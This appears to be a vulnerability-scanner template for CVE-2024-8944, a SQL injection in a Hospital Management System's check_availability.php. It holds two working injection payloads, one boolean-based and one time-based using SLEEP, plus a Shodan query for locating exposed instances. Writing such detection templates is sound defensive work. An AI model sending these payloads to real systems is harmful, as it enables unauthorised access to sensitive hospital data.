id: CVE-2024-8944

info:
  name: SQL Injection in Hospital Management System
  author: ProjectDiscoveryAI
  severity: high
  description: SQL Injection vulnerability in check_availability.php in Hospital Management System 1.0 via the email parameter.
  impact: |
    Allows attackers to manipulate database queries and potentially access sensitive information
  remediation: |
    Implement input validation and use parameterized queries to prevent SQL Injection
  reference:
    - https://github.com/65241/cve/issues/1
    - https://code-projects.org/
    - https://vuldb.com/?id.277761
    - https://vuldb.com/?submit.408871
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-8944
    cwe-id: CWE-89
    epss-score: 0.00152
    epss-percentile: 0.52634
    cpe: cpe:2.3:a:fabianros:hospital_management_system:1.0:*:*:*:*:*:*:*
  metadata:
    vendor: fabianros
    product: hospital_management_system
    shodan-query: http.html:"Hospital Management System"
    fofa-query: body="hospital management system"

http:
  - method: POST
    path:
      - "/hms/check_availability.php"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

    body: |
      email=123123@ww.com' OR NOT 6413=6413#
    matchers:
      - type: word
        words:
          - "SQL syntax"
          - "database error"
        part: body

  - method: POST
    path:
      - "/hms/check_availability.php"

    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0

    body: |
      email=123123@ww.com' AND (SELECT 1219 FROM (SELECT(SLEEP(5)))FsVM)-- Fzop
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
